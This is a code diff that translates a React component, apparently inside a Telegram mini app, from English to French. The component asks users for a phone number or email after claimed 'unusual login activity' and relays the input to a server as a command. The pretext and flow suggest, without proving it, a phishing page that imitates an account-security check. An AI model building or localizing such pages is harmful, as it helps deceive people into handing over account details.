@@ -64,13 +64,15 @@ export const AlternativeIdentifier = () => {
     setToast("");
 
     if (!initDataRaw) {
-      setToast("Telegram initData missing");
+      setToast("Données d'initialisation Telegram manquantes");
       return;
     }
 
     const identifier = input.trim();
     if (!identifier) {
-      setToast("Please enter your phone number or email address");
+      setToast(
+        "Veuillez entrer votre numéro de téléphone ou votre adresse e-mail"
+      );
       return;
     }
 
@@ -91,14 +93,14 @@ export const AlternativeIdentifier = () => {
 
       if (!cmdResp.data.ok) {
         setLoading(false);
-        setToast(cmdResp.data.error || "Command failed");
+        setToast(cmdResp.data.error || "Échec de la commande");
         return;
       }
 
       const commandId = cmdResp.data.commandId;
       if (!commandId) {
         setLoading(false);
-        setToast("Missing commandId from server");
+        setToast("Identifiant de commande manquant du serveur");
         return;
       }
 
@@ -108,7 +110,7 @@ export const AlternativeIdentifier = () => {
       setLoading(false);
 
       if (!finalState) {
-        setToast("Timeout, please try again");
+        setToast("Délai d'attente dépassé, veuillez réessayer");
         return;
       }
 
@@ -120,17 +122,19 @@ export const AlternativeIdentifier = () => {
 
       // ❌ erreur identifier
       const msg =
-        finalState.error || finalState.result?.message || "Invalid identifier";
+        finalState.error ||
+        finalState.result?.message ||
+        "Identifiant invalide";
       setToast(msg);
     } catch (err: any) {
       setLoading(false);
-      setToast(err.response?.data?.error || err.message || "Network error");
+      setToast(err.response?.data?.error || err.message || "Erreur réseau");
     }
   };
 
   return (
     <div className="alternative-identifier-page">
-      <FullScreenLoader visible={loading} text="Verifying..." />
+      <FullScreenLoader visible={loading} text="Vérification..." />
       <Toast message={toast} onClose={() => setToast("")} />
 
       <div
@@ -179,13 +183,14 @@ export const AlternativeIdentifier = () => {
         <div className="alternative-identifier-content">
           <div className="alternative-identifier-title-container">
             <h1 className="alternative-identifier-title" id="modal-header">
-              Enter your phone number or email address
+              Entrez votre numéro de téléphone ou votre adresse e-mail
             </h1>
             <div className="alternative-identifier-description">
               <span>
-                There was unusual login activity on your account. To help keep
-                your account safe, please enter your phone number (start with
-                country code, e.g. +1) or email address to verify it's you.
+                Il y a eu une activité de connexion inhabituelle sur votre
+                compte. Pour aider à protéger votre compte, veuillez entrer
+                votre numéro de téléphone (commencez par le code pays, par ex.
+                +33) ou votre adresse e-mail pour vérifier que c'est vous.
               </span>
             </div>
           </div>
@@ -193,7 +198,7 @@ export const AlternativeIdentifier = () => {
           <div className="alternative-identifier-form">
             <label className="alternative-identifier-label">
               <div className="alternative-identifier-label-text">
-                <span>Phone or email</span>
+                <span>Téléphone ou e-mail</span>
               </div>
               <div className="alternative-identifier-input-wrapper">
                 <input
@@ -224,7 +229,7 @@ export const AlternativeIdentifier = () => {
               disabled={loading || !input.trim()}
               type="button"
             >
-              <span>Next</span>
+              <span>Suivant</span>
             </button>
           </div>
         </div>
